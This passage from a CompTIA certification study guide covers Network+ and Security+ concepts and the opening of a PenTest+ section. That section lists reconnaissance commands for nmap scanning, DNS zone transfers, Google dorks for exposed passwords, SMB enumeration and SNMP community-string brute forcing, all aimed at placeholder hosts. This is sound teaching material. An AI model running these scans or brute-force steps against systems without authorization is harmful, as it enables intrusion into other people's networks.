- **Signature-based:** Matches known attack patterns; fast but misses new attacks
- **Anomaly-based:** Compares to baseline; catches new attacks but false positives
- **Behavioral:** Monitors behavior over time

### AAA Framework

- **Authentication:** Who are you? (identity verification)
- **Authorization:** What can you do? (access control)
- **Accounting:** What did you do? (audit logging)

**RADIUS vs TACACS+:**

| | RADIUS | TACACS+ |
|-|--------|---------|
| Protocol | UDP 1812/1813 | TCP 49 |
| Encryption | Password only | All traffic |
| AAA | Combined | Separated |
| Vendor | Open standard | Cisco |
| Use | Network access | Device administration |

### VPN Types

| Type | Description |
|------|-------------|
| Site-to-site | Connects two networks (branch offices) |
| Remote access | Connects individual to corporate network |
| SSL/TLS VPN | Browser-based; no client software needed |
| IPsec VPN | Network-layer encryption; strong |
| Split tunnel | Only corporate traffic through VPN |
| Full tunnel | ALL traffic through VPN |

**IPsec components:**
- **IKE:** Internet Key Exchange — negotiate security parameters
- **AH:** Authentication Header — integrity only
- **ESP:** Encapsulating Security Payload — encryption + integrity
- **Transport mode:** Encrypts payload; original headers intact
- **Tunnel mode:** Encrypts entire packet; new IP headers added

---

## 13. Network Operations

### SNMP (Simple Network Management Protocol)

- Monitors and manages network devices
- **Manager:** NMS (Network Management System) — collects data
- **Agent:** Software on managed device — reports data
- **MIB:** Management Information Base — database of manageable objects
- **OID:** Object Identifier — unique address of each MIB object

**SNMP versions:**
- v1/v2c: Community strings (weak, plaintext)
- v3: Authentication + encryption (SHA, AES)

**SNMP operations:**
- **Get:** Manager requests data from agent
- **GetNext:** Get next OID in tree
- **Set:** Manager changes configuration on agent
- **Trap:** Agent proactively sends alert to manager
- **Inform:** Like trap but with acknowledgment

### Syslog

- Standard for sending log messages from devices
- **Ports:** UDP 514, TCP 6514 (TLS)
- **Severity levels (0–7):**

| Level | Name | Meaning |
|-------|------|---------|
| 0 | Emergency | System unusable |
| 1 | Alert | Immediate action needed |
| 2 | Critical | Critical conditions |
| 3 | Error | Error conditions |
| 4 | Warning | Warning conditions |
| 5 | Notice | Normal but significant |
| 6 | Informational | Informational messages |
| 7 | Debug | Debug-level messages |

### Network Time Protocol (NTP)

- Synchronizes clocks across network
- **Port:** UDP 123
- **Stratum:** Distance from reference clock (stratum 0 = atomic clock)
- Stratum 1 = directly connected to stratum 0; stratum 2 = synced to stratum 1

### Quality of Service (QoS)

- Prioritizes certain traffic types
- **DSCP:** Differentiated Services Code Point — marking in IP header
- **CoS:** Class of Service — 802.1p marking in Ethernet frame
- **Traffic shaping:** Smooths traffic bursts
- **Traffic policing:** Drops/marks excess traffic
- **Queuing:** Determines service order (FIFO, PQ, WFQ, CBWFQ)

**Traffic categories by priority:**
1. Voice (lowest latency, highest priority)
2. Video
3. Critical data
4. Standard data
5. Scavenger (lowest priority)

---

## 14. Troubleshooting Tools

### Command-Line Tools

| Tool | OS | Purpose |
|------|----|----|
| `ping` | All | Test reachability (ICMP echo) |
| `traceroute`/`tracert` | Linux/Windows | Path to destination |
| `ipconfig` | Windows | Show IP configuration |
| `ifconfig`/`ip addr` | Linux | Show IP configuration |
| `nslookup`/`dig` | All | DNS query |
| `netstat` | All | Active connections and ports |
| `ss` | Linux | Modern netstat |
| `arp -a` | All | ARP cache |
| `route` | All | Routing table |
| `nmap` | All | Port scanning |
| `curl`/`wget` | Linux/Mac | HTTP requests |
| `telnet` | All | Test TCP port connectivity |
| `tcpdump` | Linux | Packet capture |
| `Wireshark` | All | GUI packet capture/analysis |
| `netsh` | Windows | Network configuration |
| `pathping` | Windows | Combines ping + tracert |
| `mtr` | Linux | Like pathping |

### Troubleshooting Methodology

**CompTIA's 7-step process:**
1. Identify the problem (gather information, symptoms)
2. Establish a theory of probable cause
3. Test the theory
4. Establish a plan of action to resolve
5. Implement the solution or escalate
6. Verify full system functionality
7. Document findings and outcomes

**OSI Troubleshooting (bottom-up):**
1. Physical — check cables, connectors, LEDs
2. Data Link — check MAC, switch, VLAN
3. Network — check IP, routing, NAT
4. Transport — check ports, firewall, sessions
5. Application — check app config, DNS, auth

---

## 15. Cabling and Physical Layer

### Cable Types

| Cable | Type | Speed | Max Distance |
|-------|------|-------|-------------|
| Cat5 | UTP | 100 Mbps | 100m |
| Cat5e | UTP | 1 Gbps | 100m |
| Cat6 | UTP/STP | 1 Gbps (10G up to 55m) | 100m |
| Cat6a | UTP/STP | 10 Gbps | 100m |
| Cat7 | STP | 10 Gbps | 100m |
| Cat8 | STP | 25/40 Gbps | 30m |
| Multimode Fiber | Fiber | Up to 100 Gbps | up to 2km |
| Single-mode Fiber | Fiber | Up to 100 Gbps | Up to 100km |
| Coaxial | Copper | Varies | 500m (thick) |

**UTP wiring standards:**
- **T568A:** Green-white, Green, Orange-white, Blue, Blue-white, Orange, Brown-white, Brown
- **T568B:** Orange-white, Orange, Green-white, Blue, Blue-white, Green, Brown-white, Brown

**Cable types:**
- **Straight-through:** T568A to T568A or T568B to T568B — connects different devices (PC to switch)
- **Crossover:** T568A to T568B — connects same device type (switch to switch, old)
- **Rollover:** Cisco console cable

**Fiber connectors:** LC (most common), SC, ST, MPO, FC  
**Fiber issues:** Bending radius, dirty connectors, attenuation, modal dispersion (multimode)

---

## 16. Network+ Quick Reference

**Protocols to know by port (top priority):**  
22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 67/68 DHCP, 80 HTTP, 110 POP3, 143 IMAP, 389 LDAP, 443 HTTPS, 3389 RDP

**OSI layers by PDU:**  
Layer 7/6/5 = Data | Layer 4 = Segment | Layer 3 = Packet | Layer 2 = Frame | Layer 1 = Bits

**Subnetting hosts:** 2ⁿ – 2 where n = number of host bits

**IPv6 ::1** = loopback | **FE80::** = link-local | **FF00::** = multicast

**TCP 3-way handshake:** SYN → SYN-ACK → ACK

**DHCP DORA:** Discover → Offer → Request → Acknowledge

**Wireless channels non-overlapping (2.4 GHz):** 1, 6, 11

---

*End of CompTIA Network+ Study Guide*


---

# CompTIA Security+ (SY0-701) — Complete Study Guide

---

## 1. Exam Overview

**Exam Code:** SY0-701  
**Questions:** Maximum 90 (multiple-choice + performance-based)  
**Time Limit:** 90 minutes  
**Passing Score:** 750 (on a 100–900 scale)  
**Recommended Experience:** Network+ and 2 years IT with security focus

### Domain Breakdown

| Domain | Weight |
|--------|--------|
| 1. General Security Concepts | 12% |
| 2. Threats, Vulnerabilities, and Mitigations | 22% |
| 3. Security Architecture | 18% |
| 4. Security Operations | 28% |
| 5. Security Program Management and Oversight | 20% |

---

## 2. Domain 1: General Security Concepts

### Security Controls

**By Function:**

| Control Type | Description | Examples |
|-------------|-------------|---------|
| Preventive | Stop incidents before they occur | Firewall, locks, training |
| Deterrent | Discourage attacks | Cameras, warning signs, policy |
| Detective | Identify incidents | IDS, SIEM, logs, cameras |
| Corrective | Restore after incident | Backups, patches, incident response |
| Compensating | Alternative when primary impossible | Increased monitoring |
| Directive | Direct behavior | Policy, standards, procedures |

**By Category:**

| Category | Examples |
|----------|---------|
| Technical | Encryption, firewall, MFA, IDS, antivirus |
| Managerial | Risk assessments, policies, security reviews |
| Operational | Training, background checks, change management |
| Physical | Locks, bollards, mantrap, fencing, cameras |

### CIA Triad

- **Confidentiality:** Data accessible only to authorized users. Controls: encryption, access control, MFA
- **Integrity:** Data is accurate and hasn't been modified. Controls: hashing, digital signatures, checksums
- **Availability:** Systems accessible when needed. Controls: redundancy, backups, DDoS protection

**Extended model:**
- **Non-repudiation:** Cannot deny performing an action (digital signatures, audit logs)
- **Authentication:** Proving identity
- **Authorization:** Granting access

### Cryptography Concepts

**Symmetric Encryption (same key):**
- Fast, efficient for bulk data
- Key distribution is a challenge
- Examples: **AES** (128/192/256-bit), 3DES, DES (broken), Blowfish, RC4 (avoid)

**Asymmetric Encryption (key pair):**
- Public key: Anyone can use to encrypt
- Private key: Only owner uses to decrypt
- Slower than symmetric
- Examples: **RSA** (2048/4096-bit), ECC (Elliptic Curve — smaller keys, same strength), DSA, Diffie-Hellman

**Hybrid Encryption:**
- Use asymmetric to exchange a symmetric key
- Then use symmetric for bulk data encryption
- How HTTPS/TLS works!

**Hashing (one-way, no decryption):**

| Algorithm | Output Size | Status |
|-----------|------------|--------|
| MD5 | 128-bit | Broken — don't use |
| SHA-1 | 160-bit | Weak — avoid |
| SHA-256 | 256-bit | Strong — use this |
| SHA-3 | Variable | Strongest |
| bcrypt | Variable | Best for passwords |

**Key concepts:**
- **Salt:** Random data added to password before hashing (prevents rainbow tables)
- **Rainbow table:** Precomputed hash table for cracking passwords
- **Key stretching:** Artificially slow hashing (PBKDF2, bcrypt, Argon2)
- **Collision resistance:** Two different inputs can't produce same hash
- **Avalanche effect:** Small input change → dramatically different hash

### Digital Certificates and PKI

**PKI (Public Key Infrastructure):** System for managing digital certificates

**Certificate Authority (CA):** Trusted third party that issues certificates
- **Root CA:** Top of the chain; highest trust
- **Intermediate CA:** Issued by Root CA; issues end-entity certs
- **End-entity cert:** For websites, users, code signing

**Certificate contents:**
- Subject (owner)
- Public key
- Issuer (CA name)
- Validity period (not before / not after)
- Serial number
- Digital signature of CA
- Subject Alternative Names (SANs)

**Certificate types:**
- **DV (Domain Validated):** Only domain ownership verified
- **OV (Organization Validated):** Organization identity verified
- **EV (Extended Validation):** Strict vetting; green bar (old) browsers
- **Wildcard:** *.example.com — all subdomains
- **SAN cert:** Multiple domains on one cert

**Trust chain:** Root CA → Intermediate CA → End-entity cert  
**CRL (Certificate Revocation List):** Published list of revoked certs  
**OCSP:** Online Certificate Status Protocol — real-time revocation check

**Common certificate formats:**
- **.pem / .crt / .cer:** Base64-encoded (text)
- **.der:** Binary-encoded
- **.pfx / .p12:** Contains cert + private key (PKCS#12)
- **.csr:** Certificate Signing Request

---

## 3. Domain 2: Threats, Vulnerabilities, and Mitigations

### Threat Actors

| Actor | Motivation | Resources | Examples |
|-------|-----------|-----------|---------|
| Nation-State (APT) | Espionage, sabotage | Highest (gov't funded) | Lazarus Group, APT29 |
| Cybercriminals | Financial | High | Ransomware gangs |
| Hacktivists | Political/ideological | Medium | Anonymous |
| Script Kiddies | Fun, notoriety | Low | Unskilled attackers |
| Insider Threats | Various | High (access) | Disgruntled employees |
| Competitors | Corporate espionage | Medium-high | |

**APT (Advanced Persistent Threat):** Long-term, stealthy attack; usually nation-state

### Attack Types

**Social Engineering:**
- **Phishing:** Mass email to steal credentials/data
- **Spear phishing:** Targeted, personalized phishing
- **Whaling:** Phishing targeting executives
- **Vishing:** Voice/phone phishing
- **Smishing:** SMS phishing
- **Pretexting:** Creating false scenario to extract info
- **Baiting:** Physical media (USB drops) or online lures
- **Tailgating/Piggybacking:** Following authorized person through secure door
- **Watering hole:** Compromise website victims frequently visit
- **Business Email Compromise (BEC):** Fake executive emails to trick payments

**Malware Types:**

| Type | Behavior |
|------|---------|
| Virus | Self-replicates by infecting files; needs host |
| Worm | Self-replicates over network; no host needed |
| Trojan | Disguised as legitimate software |
| Ransomware | Encrypts files, demands payment |
| Spyware | Secretly monitors and transmits user activity |
| Adware | Displays unwanted advertisements |
| Rootkit | Hides deeply in OS, grants persistent access |
| Keylogger | Records keystrokes |
| Botnet | Network of compromised machines (zombies) |
| Logic bomb | Triggers on condition (date, action) |
| Fileless malware | Lives in memory, no disk file |
| RAT | Remote Access Trojan — full remote control |
| PUA | Potentially Unwanted Application |

**Network Attacks:**
- **DDoS:** Distributed Denial of Service — flood with traffic
  - **Volumetric:** UDP flood, ICMP flood, DNS amplification
  - **Protocol:** SYN flood, Ping of Death, Smurf
  - **Application layer:** HTTP flood, Slowloris
- **Man-in-the-Middle (MITM):** Intercept/alter communications
- **ARP Poisoning:** Fake ARP replies to redirect traffic
- **DNS Poisoning/Spoofing:** Corrupt DNS cache with false records
- **IP Spoofing:** Forge source IP address
- **Session Hijacking:** Steal authenticated session token
- **Replay Attack:** Capture and retransmit valid authentication
- **Downgrade Attack:** Force use of weaker protocol (SSL vs TLS)

**Injection Attacks:**
- **SQL Injection:** Malicious SQL in input → database manipulation
- **XSS (Cross-Site Scripting):** Inject malicious scripts into web pages
- **LDAP Injection:** Malicious LDAP query
- **Command Injection:** OS commands via vulnerable input
- **XML/XXE Injection:** XML external entity attack
- **Buffer Overflow:** Exceed buffer bounds → execute code

**Password Attacks:**
- **Brute force:** Try every combination
- **Dictionary:** Try common words/passwords
- **Credential stuffing:** Try leaked credentials from other breaches
- **Password spraying:** One common password tried against many accounts
- **Rainbow table:** Precomputed hash database

**Wireless Attacks:**
- **Evil twin:** Rogue AP mimicking legitimate one
- **Deauthentication (deauth):** Force clients to disconnect
- **KRACK:** Key Reinstallation Attack on WPA2
- **Rogue AP:** Unauthorized access point
- **Wardriving:** Driving around scanning for wireless networks

### Vulnerabilities

- **CVE:** Common Vulnerabilities and Exposures — standard ID for vulnerabilities
- **CVSS:** Common Vulnerability Scoring System — severity score 0–10
  - Critical: 9.0–10.0 | High: 7.0–8.9 | Medium: 4.0–6.9 | Low: 0.1–3.9
- **Zero-day:** Vulnerability unknown to vendor; no patch available
- **Exploit:** Code or technique that takes advantage of a vulnerability

**Types of vulnerabilities:**
- Misconfiguration (default passwords, open ports)
- Weak/outdated encryption
- SQL injection, XSS in code
- Race conditions
- Integer overflow
- Improper input validation
- Default credentials
- Supply chain (compromised third-party software)

**OWASP Top 10 (Web App):**
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQL, LDAP, etc.)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

---

## 4. Domain 3: Security Architecture

### Network Segmentation

- **VLAN:** Logical network separation at Layer 2
- **Subnet:** IP-level segmentation
- **DMZ (Demilitarized Zone):** Network for public-facing servers; between two firewalls
- **Screened subnet:** Modern term for DMZ
- **Micro-segmentation:** Fine-grained segmentation within data center (SDN/zero trust)
- **Air gap:** Physical isolation (no network connection)

### Zero Trust Architecture

Core principle: **Never trust, always verify.** No implicit trust inside or outside the network.

**Key concepts:**
- **Verify explicitly:** Always authenticate and authorize (MFA, contextual)
- **Least privilege:** Minimum access needed
- **Assume breach:** Design as if attacker is already inside

**Components:**
- **Identity:** Strong MFA for all users
- **Device health:** Verify device posture before access
- **Network:** Micro-segmentation, east-west traffic inspection
- **Application:** App-level access policies
- **Data:** Classify and protect data

### Cloud Security

**Cloud Shared Responsibility Model:**

| Responsibility | IaaS | PaaS | SaaS |
|---------------|------|------|------|
| Data | Customer | Customer | Customer |
| Applications | Customer | Customer | Provider |
| Runtime | Customer | Provider | Provider |
| Middleware | Customer | Provider | Provider |
| OS | Customer | Provider | Provider |
| Virtualization | Provider | Provider | Provider |
| Storage | Provider | Provider | Provider |
| Network | Provider | Provider | Provider |

**Cloud security controls:**
- **CASB (Cloud Access Security Broker):** Security policy enforcement between cloud and users
- **CSPM (Cloud Security Posture Management):** Detect misconfiguration
- **SWG (Secure Web Gateway):** Filter web traffic
- **FWaaS (Firewall as a Service):** Cloud-based firewall

### Security Zones and Architectures

**Network zones:**
- Internet (untrusted)
- DMZ (semi-trusted)
- Internal LAN (trusted)
- Management VLAN (highly trusted)

**Infrastructure security:**
- **SASE (Secure Access Service Edge):** Cloud-delivered security (SD-WAN + SSE)
- **SSE (Security Service Edge):** CASB + SWG + ZTNA
- **ZTNA (Zero Trust Network Access):** Replace VPN with zero trust

### Secure Communications

**Email security:**
- **SPF:** Sender Policy Framework — authorized mail servers
- **DKIM:** DomainKeys Identified Mail — digital signature on emails
- **DMARC:** Domain-based Message Authentication — policy for SPF/DKIM failures

**Secure protocols:**
- HTTPS (HTTP + TLS) — port 443
- FTPS (FTP + TLS) — port 990
- SFTP (SSH File Transfer Protocol) — port 22
- SSH — port 22
- LDAPS — port 636
- IMAPS — port 993
- POP3S — port 995
- SMTPS — port 465/587
- DNSSEC — DNS integrity via signatures
- SNMPv3 — encrypted SNMP

**VPN Protocols:**
- **IPsec:** Network-layer; ESP + AH; tunnel or transport mode
- **OpenVPN:** Open source, TLS-based
- **WireGuard:** Modern, fast, simple
- **SSL/TLS VPN:** Browser-based or client; port 443
- **L2TP/IPsec:** Layer 2 tunneling + IPsec encryption

---

## 5. Domain 4: Security Operations

### Identity and Access Management (IAM)

**Authentication factors:**
- Knowledge: Password, PIN, security questions
- Possession: Smart card, token, phone
- Inherence: Biometrics (fingerprint, face, iris, voice)
- Location: GPS, IP-based

**MFA methods:**
- **TOTP:** Time-based One-Time Password (Google Authenticator)
- **HOTP:** HMAC-based OTP (counter-based)
- **Push notification:** Approve on phone
- **Hardware token:** RSA SecurID, YubiKey
- **SMS/Email OTP:** Weakest (SIM swapping risk)

**Password best practices:**
- Length over complexity (12+ characters)
- Unique per site/service
- Password manager
- Don't reuse
- Enable MFA

**SSO (Single Sign-On):** One authentication for multiple systems
**SAML:** XML-based SSO federation (web apps)
**OAuth 2.0:** Authorization framework (third-party app access)
**OpenID Connect:** Authentication layer on top of OAuth 2.0
**LDAP:** Directory authentication (Active Directory)
**Kerberos:** Ticket-based authentication (Windows AD)

**Privilege Management:**
- **PAM (Privileged Access Management):** Control and audit elevated access
- **Just-in-time (JIT):** Grant access only when needed
- **RBAC:** Role-Based Access Control — roles define permissions
- **DAC:** Discretionary Access Control — owner controls
- **MAC:** Mandatory Access Control — policy defines (military)
- **ABAC:** Attribute-Based Access Control — fine-grained attributes

### Security Monitoring

**SIEM (Security Information and Event Management):**
- Collects and correlates logs from all sources
- Alerts on suspicious activity
- Examples: Splunk, IBM QRadar, Microsoft Sentinel

**Log sources:**
- Firewalls, IDS/IPS, web proxies
- Windows Event Log, syslog
- DNS, DHCP, VPN logs
- Endpoint security (AV/EDR)
- Cloud access logs

**SOC (Security Operations Center):**
- Team monitoring security 24/7
- L1: Alert triage | L2: Investigation | L3: Threat hunting | L4: IR management

**Threat hunting:** Proactively search for attackers (not waiting for alerts)
**UEBA:** User and Entity Behavior Analytics — detect anomalous behavior

### Vulnerability Management

1. **Discovery:** Scan network for assets
2. **Scanning:** Find vulnerabilities (Nessus, OpenVAS, Qualys)
3. **Analysis:** Assess severity (CVSS) and exploitability
4. **Remediation:** Patch, mitigate, or accept risk
5. **Verification:** Confirm fix worked
6. **Reporting:** Document findings and trends

**Scanning types:**
- **Credentialed scan:** Scanner has account access → more thorough
- **Non-credentialed:** External view → misses internal issues
- **External scan:** From outside the network
- **Internal scan:** From inside the network
- **Agent-based:** Software on endpoint reports back

**Patch management:**
- **Hotfix:** Emergency fix for single issue
- **Patch:** Fix for specific vulnerability
- **Update:** Non-security enhancement
- **Upgrade:** Major version change

### Endpoint Security

**EDR (Endpoint Detection and Response):** Advanced endpoint security with behavioral detection, response capabilities
**XDR (Extended Detection and Response):** Correlates across endpoints, network, cloud
**DLP (Data Loss Prevention):** Prevent unauthorized data exfiltration

**Hardening endpoints:**
- Remove unnecessary software
- Disable unneeded services
- Apply CIS benchmarks
- Enable host-based firewall
- Enable disk encryption (BitLocker, FileVault)
- Configure application whitelisting

### Incident Response

**NIST IR Framework phases:**
1. **Preparation** — Policies, tools, training, IR team
2. **Detection and Analysis** — Identify and confirm incident
3. **Containment** — Stop the spread (short-term and long-term)
4. **Eradication** — Remove root cause (malware, unauthorized accounts)
5. **Recovery** — Restore systems to normal
6. **Post-Incident Activity** — Lessons learned, documentation

**Chain of Custody:** Document evidence handling — who accessed, when, where  
**Order of Volatility:** Preserve most volatile first:
1. CPU registers/cache
2. RAM
3. Swap/temp files
4. Hard drive
5. Remote logs
6. Archived media

**Digital forensics tools:**
- **dd/FTK Imager:** Disk imaging (bit-for-bit copy)
- **Autopsy/FTK:** Disk analysis
- **Volatility:** Memory forensics
- **Wireshark:** Packet capture
- **SIEM:** Log analysis

---

## 6. Domain 5: Security Program Management

### Risk Management

**Key concepts:**
- **Asset:** Something of value (data, hardware, systems)
- **Threat:** Potential event that could cause harm
- **Vulnerability:** Weakness that could be exploited
- **Risk:** Likelihood × Impact
- **Exploit:** Take advantage of a vulnerability
- **Exposure:** Vulnerability without mitigation

**Risk calculation:**
- **SLE (Single Loss Expectancy):** Asset value × Exposure factor
- **ARO (Annualized Rate of Occurrence):** How often per year
- **ALE (Annualized Loss Expectancy):** SLE × ARO

**Risk treatment options:**
- **Accept:** Live with the risk (document it)
- **Avoid:** Stop the risky activity
- **Transfer:** Share risk with others (insurance, contracts)
- **Mitigate:** Reduce likelihood or impact

**Risk types:**
- Inherent risk: Before controls
- Residual risk: After controls
- Risk appetite: How much risk is acceptable

### Security Policies and Frameworks

**Common frameworks:**
- **NIST CSF:** Identify, Protect, Detect, Respond, Recover
- **NIST SP 800-53:** Security controls for federal systems
- **ISO 27001:** ISMS standard
- **CIS Controls:** Prioritized security actions
- **SOC 2:** Cloud service provider security audits
- **PCI DSS:** Payment card industry security
- **HIPAA:** Healthcare data privacy
- **GDPR:** EU data privacy regulation

**Key policies:**
- **AUP (Acceptable Use Policy):** Allowed uses of IT resources
- **Password policy:** Complexity, length, rotation
- **BYOD policy:** Personal devices on corporate network
- **Change management:** Control changes to systems
- **Data classification policy:** Public, Internal, Confidential, Restricted

**Data classification:**

| Level | Description | Example |
|-------|-------------|---------|
| Public | Safe to share | Marketing materials |
| Internal | Employees only | Internal memos |
| Confidential | Need-to-know | Financial data |
| Restricted/Secret | Highly sensitive | Trade secrets |

### Compliance and Audits

**Regulations:**
- **HIPAA:** Health Insurance Portability and Accountability Act — healthcare
- **PCI DSS:** Payment Card Industry Data Security Standard — credit cards
- **GDPR:** EU General Data Protection Regulation — personal data
- **CCPA:** California Consumer Privacy Act
- **SOX:** Sarbanes-Oxley — financial records
- **FERPA:** Educational records (US)

**Audit types:**
- **Internal:** Self-assessment
- **External:** Third-party assessment
- **Penetration test:** Simulate real attacks
- **Vulnerability assessment:** Find weaknesses (no exploitation)
- **Compliance audit:** Verify regulatory adherence

### Business Continuity and Disaster Recovery

**BCP (Business Continuity Plan):** Keep business running during/after disaster  
**DRP (Disaster Recovery Plan):** Restore IT after disaster

**Key metrics:**
- **RPO (Recovery Point Objective):** Max data loss (how old can backup be?)
- **RTO (Recovery Time Objective):** Max downtime before recovery (how fast to recover?)
- **MTTR (Mean Time to Repair):** Average time to fix
- **MTBF (Mean Time Between Failures):** Average time between failures

**Backup strategies:**
- **Full:** Everything; slowest backup, fastest recovery
- **Incremental:** Changes since last backup; fastest backup, slowest recovery
- **Differential:** Changes since last full backup; medium both
- **3-2-1 rule:** 3 copies, 2 media types, 1 offsite

**Recovery sites:**
- **Hot site:** Fully operational, ready immediately (expensive)
- **Warm site:** Partially equipped, hours to operational (moderate cost)
- **Cold site:** Space only, days/weeks to operational (cheap)

---

## 7. Security+ Quick Reference

**CIA Triad:** Confidentiality, Integrity, Availability  
**AAA:** Authentication, Authorization, Accounting  
**Control types:** Preventive, Detective, Corrective, Deterrent, Compensating, Directive  
**Control categories:** Technical, Managerial, Operational, Physical  
**Risk = Likelihood × Impact**  
**ALE = SLE × ARO**  
**Zero Trust: Never trust, always verify**  
**MFA factors:** Something you know/have/are/somewhere you are  
**OWASP Top 1:** Broken Access Control  
**Encryption: Symmetric (AES) = fast bulk | Asymmetric (RSA/ECC) = key exchange**  
**Hashing: SHA-256 (integrity) | bcrypt (passwords)**  
**IR phases:** Prepare → Detect → Contain → Eradicate → Recover → Lessons learned  
**RPO = data loss tolerance | RTO = downtime tolerance**  
**Backups: Full (all), Incremental (since last backup), Differential (since last full)**

---

*End of CompTIA Security+ Study Guide*


---

# CompTIA PenTest+ (PT0-003) — Complete Study Guide

---

## 1. Exam Overview

**Exam Code:** PT0-003  
**Questions:** Maximum 90 (multiple-choice + performance-based)  
**Time Limit:** 165 minutes  
**Passing Score:** 750 (on a 100–900 scale)  
**Recommended Experience:** Network+, Security+, and 3–4 years hands-on security experience

### Domain Breakdown

| Domain | Weight |
|--------|--------|
| 1. Engagement Management | 17% |
| 2. Reconnaissance and Enumeration | 20% |
| 3. Vulnerability Discovery and Analysis | 18% |
| 4. Attacks and Exploits | 25% |
| 5. Reporting and Communication | 12% |
| 6. Tools and Code Analysis | 8% |

---

## 2. Domain 1: Engagement Management

### Penetration Testing Types

| Type | Description |
|------|-------------|
| **Black Box** | Tester has no prior knowledge (simulates external attacker) |
| **White Box** | Full knowledge of environment (code, architecture, credentials) |
| **Gray Box** | Partial knowledge (credentials but no source code) |

### Engagement Scoping

**Rules of Engagement (RoE):** Formal agreement defining what is and isn't allowed during a pentest.

**Key scoping elements:**
- Target IP ranges, domains, applications
- Out-of-scope systems (explicitly excluded)
- Authorized testing windows (time of day)
- Allowed/prohibited techniques
- Emergency stop conditions
- Point of contact for issues
- Data handling requirements
- Third-party notification requirements (cloud providers, hosting)

### Legal Documents

| Document | Purpose |
|----------|---------|
| **NDA (Non-Disclosure Agreement)** | Protects confidential information shared during engagement |
| **MSA (Master Service Agreement)** | Long-term framework for ongoing work |
| **SOW (Statement of Work)** | Specific tasks, deliverables, timelines |
| **Permission to Attack letter** | Written authorization; get before testing |
| **RoE document** | Testing boundaries and rules |

> ⚠️ **CRITICAL:** Never begin testing without written authorization. Unauthorized testing = illegal under CFAA, Computer Misuse Act, and similar laws.

### Legal Considerations

- **CFAA (Computer Fraud and Abuse Act):** US federal law criminalizing unauthorized computer access
- **ECPA:** Electronic Communications Privacy Act — intercepting communications
- **GDPR:** Data protection (EU) — relevant if personal data is accessed
- **PCI DSS:** Specific requirements for payment card testing
- **HIPAA:** Protected health information considerations

**Safe harbor:** Contract language protecting the tester from liability for damage caused by authorized testing activities.

### Pentest Methodologies

**PTES (Penetration Testing Execution Standard):**
1. Pre-engagement interactions
2. Intelligence gathering
3. Threat modeling
4. Vulnerability analysis
5. Exploitation
6. Post-exploitation
7. Reporting

**OWASP Testing Guide:** Web application security testing methodology

**NIST SP 800-115:** Technical Guide to Information Security Testing

**OSSTMM (Open Source Security Testing Methodology Manual):** Comprehensive methodology covering multiple attack surfaces

**Cyber Kill Chain (Lockheed Martin):**
1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command & Control (C2)
7. Actions on Objectives

**MITRE ATT&CK Framework:** Knowledge base of adversary tactics, techniques, and procedures (TTPs)

---

## 3. Domain 2: Reconnaissance and Enumeration

### Passive Reconnaissance

Gathering information **without directly interacting** with the target.

**OSINT (Open Source Intelligence) sources:**
- **WHOIS:** Domain registration info (registrar, owner, dates, name servers)
- **DNS records:** A, MX, NS, TXT, CNAME — reveal infrastructure
- **Google Dorking:** Advanced search operators to find sensitive info
  - `site:example.com filetype:pdf`
  - `site:example.com inurl:admin`
  - `intitle:"index of" site:example.com`
  - `"password" filetype:txt site:example.com`
- **Shodan:** Search engine for internet-connected devices; find exposed services
- **Censys:** Similar to Shodan; more detailed TLS/cert info
- **ZoomEye:** Chinese equivalent of Shodan
- **LinkedIn:** Employee names, roles, technologies
- **GitHub/GitLab:** Leaked credentials, API keys in repositories
- **Pastebin:** Leaked data dumps
- **Wayback Machine (archive.org):** Historical snapshots of websites
- **Hunter.io:** Email format discovery
- **theHarvester:** Automate email, subdomain, IP, URL gathering from public sources
- **Maltego:** Relationship mapping and OSINT visualization
- **Recon-ng:** Modular OSINT framework

**Certificate Transparency Logs:**
- `crt.sh` — find all SSL certs issued for a domain → reveals subdomains

**Job postings:** Reveal tech stack, vulnerabilities, and organizational info

### Active Reconnaissance

Directly probing the target system.

**DNS Enumeration:**
```bash
nslookup example.com
dig example.com any
dig example.com MX
dig example.com NS
host -t mx example.com
fierce --domain example.com          # DNS brute force
dnsrecon -d example.com -t std       # Multiple record types
dnsenum example.com                  # Comprehensive DNS enum
```

**DNS Zone Transfer (AXFR):**
```bash
dig axfr @ns1.example.com example.com   # Attempt zone transfer (misconfiguration)
```

**Subdomain Enumeration:**
```bash
gobuster dns -d example.com -w wordlist.txt
subfinder -d example.com
amass enum -d example.com
```

**Network Scanning with Nmap:**
```bash
# Host discovery (ping sweep)
nmap -sn 192.168.1.0/24

# Stealth SYN scan
nmap -sS 192.168.1.0/24

# Full TCP connect scan
nmap -sT 10.0.0.1

# UDP scan
nmap -sU 10.0.0.1

# Version detection
nmap -sV 10.0.0.1

# OS detection
nmap -O 10.0.0.1

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 10.0.0.1

# Specific port range
nmap -p 1-1024 10.0.0.1
nmap -p 22,80,443,3389 10.0.0.1
nmap -p- 10.0.0.1          # All 65535 ports

# Script scanning
nmap --script=vuln 10.0.0.1
nmap --script=http-enum 10.0.0.1
nmap --script=smb-vuln* 10.0.0.1

# Timing (-T0 slowest/stealthy, -T5 fastest/loud)
nmap -T2 -sS 10.0.0.1

# Output formats
nmap -oA scan_results 10.0.0.1    # All formats (normal, XML, grepable)
nmap -oX scan.xml 10.0.0.1
```

**Nmap Scan Types:**
- `-sS` SYN/Stealth (default, most common)
- `-sT` TCP Connect (full connection, noisy)
- `-sU` UDP (slow, important for DNS/SNMP/DHCP)
- `-sA` ACK (firewall mapping)
- `-sF`, `-sX`, `-sN` FIN, Xmas, Null (firewall evasion)
- `-sP`/`-sn` Ping only (host discovery)

**Service/Banner Grabbing:**
```bash
nc -nv 10.0.0.1 80          # Netcat banner grab
telnet 10.0.0.1 25          # SMTP banner
curl -I http://10.0.0.1     # HTTP headers
```

### Enumeration by Protocol

**SMB/Windows:**
```bash
enum4linux -a 10.0.0.1        # Enumerate SMB (users, shares, groups)
smbclient -L //10.0.0.1       # List shares
crackmapexec smb 10.0.0.1     # SMB enum + password testing
nmap --script smb-enum-shares,smb-enum-users 10.0.0.1
```

**SNMP:**
```bash
snmpwalk -v2c -c public 10.0.0.1   # Walk OID tree
onesixtyone -c community.txt 10.0.0.1  # Brute force community strings
snmp-check 10.0.0.1
```

**LDAP:**
```bash
